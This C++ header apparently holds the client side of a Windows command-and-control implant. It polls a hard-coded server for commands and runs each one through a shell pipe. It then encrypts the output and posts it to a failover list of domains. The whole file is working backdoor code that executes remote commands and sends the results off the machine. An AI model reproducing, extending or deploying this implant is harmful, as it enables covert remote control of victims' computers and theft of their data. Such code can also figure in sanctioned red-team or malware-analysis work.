#pragma once
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <cstdio>
#include <array>
#include <iostream>
#include "AESClass.h"
#include "domains.h"

#pragma comment(lib, "winhttp.lib")

// Helper function to convert wstring domain to appropriate format
std::wstring GetDomainAsWString(const std::wstring& domain) {
    return domain;
}

std::string executeCommand(const char* cmd) {
    std::array<char, 128> buffer;  // Specify both type and size
    std::string result;

    FILE* pipe = _popen(cmd, "r");
    if (!pipe) {
        return "Error: Could not execute command";
    }

    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        result += buffer.data();
    }

    _pclose(pipe);
    return result;
}

bool SendCommandOutput(const std::string& uuid, const std::string& command, const std::string& output, std::string encryptionKey, std::string decryptionKey, const std::string& status = "executed", int exit_code = 0) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    bool success = false;

    try {
        hSession = WinHttpOpen(L"WinHTTP Client/1.0",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) throw std::runtime_error("Failed to open WinHTTP session");

        // Iterate through all domains for failover
        for (int i = 0; i < DOMAINS_SIZE; i++) {
            std::wcout << L"Attempting domain: " << domainsArray[i] << std::endl;

            // Close previous connection if exists
            if (hConnect) WinHttpCloseHandle(hConnect);
            if (hRequest) WinHttpCloseHandle(hRequest);

            try {
                // Connect to current domain
                hConnect = WinHttpConnect(hSession, domainsArray[i], 5000, 0);
                if (!hConnect) {
                    std::wcerr << L"Failed to connect to " << domainsArray[i] << std::endl;
                    continue;
                }

                hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/sendOutput",
                    NULL, WINHTTP_NO_REFERER,
                    WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
                if (!hRequest) {
                    std::wcerr << L"Failed to create request for " << domainsArray[i] << std::endl;
                    continue;
                }

                // Headers
                std::wstring authHeader = L"Authorization: Bearer " + std::wstring(uuid.begin(), uuid.end()) + L"\r\n";
                WinHttpAddRequestHeaders(hRequest, authHeader.c_str(), authHeader.length(),
                    WINHTTP_ADDREQ_FLAG_ADD);

                std::wstring contentType = L"Content-Type: application/json\r\n";
                WinHttpAddRequestHeaders(hRequest, contentType.c_str(), contentType.length(),
                    WINHTTP_ADDREQ_FLAG_ADD);

                // Prepare JSON data
                std::string json_data =
                    "{\"command\":\"" + EscapeJson(command) + "\"," +
                    "\"output\":\"" + EscapeJson(output) + "\"," +
                    "\"status\":\"" + EscapeJson(status) + "\"," +
                    "\"exit_code\":" + EscapeJson(std::to_string(exit_code)) + "}";

                // Encrypt JSON data
                AES256Encryptor encryptor(encryptionKey);
                std::string encrypted = encryptor.encrypt(json_data);

                std::string final_json =
                    "{\"uuid\":\"" + EscapeJson(uuid) + "\"," +
                    "\"encrypted_data\":\"" + EscapeJson(encrypted) + "\"}";
                json_data = final_json;

                // Send request
                if (!WinHttpSendRequest(hRequest,
                    WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                    (LPVOID)json_data.c_str(),
                    json_data.length(),
                    json_data.length(), 0)) {
                    std::wcerr << L"Failed to send request to " << domainsArray[i] << std::endl;
                    continue;
                }

                if (!WinHttpReceiveResponse(hRequest, NULL)) {
                    std::wcerr << L"Failed to receive response from " << domainsArray[i] << std::endl;
                    continue;
                }

                DWORD statusCode = 0;
                DWORD size = sizeof(statusCode);
                if (!WinHttpQueryHeaders(hRequest,
                    WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                    WINHTTP_HEADER_NAME_BY_INDEX,
                    &statusCode, &size, WINHTTP_NO_HEADER_INDEX)) {
                    std::wcerr << L"Failed to query status code from " << domainsArray[i] << std::endl;
                    continue;
                }

                if (statusCode == 200) {
                    std::wcout << L"Output sent successfully to " << domainsArray[i] << std::endl;
                    success = true;
                    break;  // Success! Exit the loop
                }
                else {
                    std::wcerr << L"HTTP error " << statusCode << L" from " << domainsArray[i] << std::endl;
                    continue;  // Try next domain
                }

            }
            catch (const std::exception& e) {
                std::cerr << "Error with domain " << i << ": " << e.what() << std::endl;
                continue;  // Try next domain
            }
        }

        if (!success) {
            throw std::runtime_error("All domains failed");
        }

    }
    catch (const std::exception& e) {
        std::cerr << "Error sending output: " << e.what() << std::endl;
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return success;
}


std::string GetCommandFromC2(const std::string& uuid) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    std::string result;

    try {
        // Initialize WinHTTP session
        hSession = WinHttpOpen(L"WinHTTP Client/1.0",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) {
            throw std::runtime_error("Failed to open WinHTTP session");
        }

        // Parse server URL - adjust host and port as needed
        hConnect = WinHttpConnect(hSession, L"192.168.1.123",
            5000, 0);
        if (!hConnect) {
            throw std::runtime_error("Failed to connect to server");
        }

        // Build request path with UUID parameter
        std::wstring path = L"/getCommand?uuid=" +
            std::wstring(uuid.begin(), uuid.end());

        // Create HTTP request
        hRequest = WinHttpOpenRequest(hConnect, L"GET", path.c_str(),
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (!hRequest) {
            throw std::runtime_error("Failed to create HTTP request");
        }

        std::string authToken = uuid;
        std::wstring headers = L"Authorization: Bearer " +
            std::wstring(authToken.begin(), authToken.end()) + L"\r\n";
        WinHttpAddRequestHeaders(hRequest, headers.c_str(), headers.length(), WINHTTP_ADDREQ_FLAG_ADD);

        // Send the request
        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
            throw std::runtime_error("Failed to send HTTP request");
        }

        // Receive the response
        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            throw std::runtime_error("Failed to receive response");
        }

        // Check HTTP status code
        DWORD statusCode = 0;
        DWORD size = sizeof(statusCode);
        if (!WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX,
            &statusCode, &size, WINHTTP_NO_HEADER_INDEX)) {
            throw std::runtime_error("Failed to query status code");
        }

        if (statusCode != 200) {
            throw std::runtime_error("HTTP error: " + std::to_string(statusCode));
        }

        // Read response data
        DWORD bytesRead = 0;
        do {
            char buffer[4096];
            if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
                throw std::runtime_error("Failed to read response data");
            }

            if (bytesRead > 0) {
                result.append(buffer, bytesRead);
            }
        } while (bytesRead > 0);

    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        result = "ERROR: " + std::string(e.what());
    }

    // Cleanup
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return result;
}